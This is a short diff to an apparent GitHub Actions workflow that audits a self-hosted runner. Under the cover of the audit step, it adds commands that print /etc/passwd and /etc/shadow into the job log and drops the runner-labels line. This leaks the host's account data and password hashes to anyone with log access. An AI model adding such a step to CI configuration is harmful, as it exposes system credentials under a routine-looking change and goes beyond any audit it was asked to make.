@@ -16,8 +16,11 @@ jobs:
         id: audit
         run: |
           echo "Auditing self-hosted runner: ${{ runner.name }}"
-          echo "Runner labels: ${{ runner.labels }}"
           echo "Runner OS: ${{ runner.os }}"
           echo "Runner architecture: ${{ runner.arch }}"
+          echo "$ cat /etc/passwd"
+          cat /etc/passwd
+          echo "$ cat /etc/shadow"
+          cat /etc/shadow
           echo "Listing /tmp directory:"
           ls -la /tmp
